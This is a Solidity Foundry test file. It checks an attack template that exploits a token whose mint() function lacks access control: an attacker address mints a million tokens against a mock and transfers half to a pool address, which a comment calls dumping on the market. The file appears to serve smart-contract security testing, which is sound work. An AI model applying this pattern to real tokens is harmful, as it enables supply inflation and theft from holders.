// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mocks/MockMintToken.sol";
import "../src/attacks/permissionless_mint.sol";

/**
 * @title PermissionlessMintTest
 * @notice Proves the `permissionless_mint` template: the token's mint() has
 *         no access control, so any address can inflate the supply for free.
 */
contract PermissionlessMintTest is Test {
    MockMintToken public token;
    PermissionlessMintAttack public attackContract;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        token = new MockMintToken();
        attackContract = new PermissionlessMintAttack();
    }

    function testPermissionlessMint() public {
        vm.prank(attacker);
        uint256 minted = attackContract.attack(address(token), 1_000_000 ether);

        assertEq(minted, 1_000_000 ether, "attacker minted unlimited supply");
        assertEq(token.balanceOf(attacker), 1_000_000 ether, "attacker holds minted tokens");
        assertEq(token.totalSupply(), 1_000_000 ether, "supply inflated out of thin air");

        // attacker dumps on the market / transfers freely
        address pool = makeAddr("pool");
        vm.prank(attacker);
        token.transfer(pool, 500_000 ether);
        assertEq(token.balanceOf(pool), 500_000 ether, "dump executed");
    }
}
